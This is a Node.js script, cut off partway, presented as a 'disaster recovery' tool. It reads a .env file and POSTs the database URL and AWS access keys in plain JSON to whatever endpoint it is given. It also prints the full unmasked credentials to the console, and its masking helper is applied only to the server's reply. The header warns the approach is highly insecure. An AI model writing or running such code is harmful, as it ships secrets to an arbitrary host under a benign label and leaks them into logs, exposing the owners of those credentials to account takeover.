#!/usr/bin/env node

/**
 * Disaster Recovery - Credential Submission
 *
 * SECURITY WARNING: This script posts credentials to an endpoint.
 * This approach is HIGHLY UNSECURE for production environments.
 *
 * Use ONLY in controlled environments where:
 * - The endpoint is internal/intranet only
 * - TLS/SSL encryption is present
 * - The endpoint is isolated from external threats
 * - Access to the endpoint is restricted
 */

const https = require('https');
const http = require('http');
const fs = require('fs');
const url = require('url');

// ANSI colors for terminal output
const colors = {
  reset: '\x1b[0m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  bold: '\x1b[1m',
};

const log = {
  info: (msg) => console.log(`${colors.blue}[INFO]${colors.reset} ${msg}`),
  success: (msg) => console.log(`${colors.green}[SUCCESS]${colors.reset} ${msg}`),
  error: (msg) => console.error(`${colors.red}[ERROR]${colors.reset} ${msg}`),
  warning: (msg) => console.warn(`${colors.yellow}[WARNING]${colors.reset} ${msg}`),
  section: (msg) => console.log(`\n${colors.cyan}${colors.bold}${msg}${colors.reset}`),
};

// Load environment variables from file
function loadEnvFile(envPath) {
  if (!fs.existsSync(envPath)) {
    log.error(`Environment file not found: ${envPath}`);
    return null;
  }

  log.info(`Loading environment from: ${envPath}`);

  const envContent = fs.readFileSync(envPath, 'utf-8');
  const envVars = {};

  envContent.split('\n').forEach((line) => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) return;

    // Check if line looks like an environment variable assignment
    const match = /^\s*([A-Z_][A-Z0-9_]*)\s*=\s*['"]?(.+?)['"]?\s*$/i.exec(trimmed);
    if (match) {
      const varName = match[1];
      let varValue = match[2];

      // Unescape quotes if present
      if ((varValue.startsWith('"') && varValue.endsWith('"')) ||
          (varValue.startsWith("'") && varValue.endsWith("'"))) {
        varValue = varValue.slice(1, -1);
      }

      envVars[varName] = varValue;
    }
  });

  return envVars;
}

/**
 * POST credentials to DR endpoint
 */
async function submitCredentials(drEndpoint, credentials) {
  log.section('Submitting Credentials to Disaster Recovery Endpoint');
  log.info(`Target: ${drEndpoint}`);

  // Mask sensitive information for logging
  function maskSensitive(data, maxMaskLength = 4) {
    const result = JSON.parse(JSON.stringify(data));

    // Helper function to mask a value
    const maskValue = (value) => {
      if (!value || typeof value !== 'string') return value;
      if (value.length <= maxMaskLength) return '*'.repeat(maxMaskLength);
      return value.substring(0, maxMaskLength) + '*' + value.substring(value.length - maxMaskLength);
    };

    // Recursively process nested objects/arrays
    const maskDeep = (obj) => {
      if (typeof obj === 'string') {
        return maskValue(obj);
      } else if (obj && Array.isArray(obj)) {
        return obj.map(maskDeep);
      } else if (obj && typeof obj === 'object') {
        const masked = {};
        for (const key of Object.keys(obj)) {
          masked[key] = maskDeep(obj[key]);
        }
        return masked;
      }
      return obj;
    };

    return maskDeep(result);
  }

  log.info(`Submitting ${JSON.stringify(credentials, null, 2)}`);
  log.warning(`Note: Full credentials will be transmitted to the DR endpoint`);
  log.warning(`⚠️  Ensure the DR endpoint is securely protected!\n`);

  // Parse the endpoint URL
  const parsedUrl = new URL(drEndpoint);

  const postData = JSON.stringify(credentials);

  const options = {
    hostname: parsedUrl.hostname,
    port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
    path: parsedUrl.pathname + parsedUrl.search,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData),
      'User-Agent': 'DR-Credential-Sync/1.0',
    },
  };

  log.info(`Making request to: ${parsedUrl.hostname}:${options.port}${parsedUrl.pathname}`);

  try {
    return new Promise((resolve, reject) => {
      const timeoutMs = 10000; // 10 second timeout

      const req = (parsedUrl.protocol === 'https:' ? https : http).request(options, (res) => {
        let body = '';

        res.on('data', (chunk) => {
          body += chunk;
        });

        res.on('end', () => {
          log.info(`Response status: ${res.statusCode}`);

          try {
            const response = JSON.parse(body);
            log.success(`Response: ${JSON.stringify(maskSensitive(response))}`);

            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve({
                success: true,
                statusCode: res.statusCode,
                response: response
              });
            } else {
              log.error(`Failed: ${res.statusCode}`);
              resolve({
                success: false,
                statusCode: res.statusCode,
                response: response,
                error: body
              });
            }
          } catch (parseError) {
            log.error(`Failed to parse response: ${parseError.message}`);
            resolve({
              success: false,
              statusCode: res.statusCode,
              response: body,
              error: 'Failed to parse JSON response'
            });
          }
        });
      });

      req.on('error', (error) => {
        log.error(`Request failed: ${error.message}`);
        reject(error);
      });

      req.on('timeout', () => {
        log.error('Request timeout');
        log.error('The DR endpoint may not be running or may be unreachable');
        req.destroy();
        reject(new Error('Request timeout'));
      });

      req.setTimeout(timeoutMs);

      req.write(postData);
      req.end();
    });
  } catch (error) {
    log.error(`Submission failed: ${error.message}`);
    throw error;
  }
}

/**
 * Create credentials object from environment
 */
function createCredentialsObject(env) {
  if (!env) {
    throw new Error('No environment variables loaded');
  }

  return {
    submission_timestamp: new Date().toISOString(),
    environment: 'test',
    credentials: {
      database_url: env.DATABASE_URL || null,
      url: env.DATABASE_URL ? env.DATABASE_URL.replace(/:[^:]+@/, ':***@') : null,
      aws_access_key_id: env.AWS_ACCESS_KEY_ID || null,
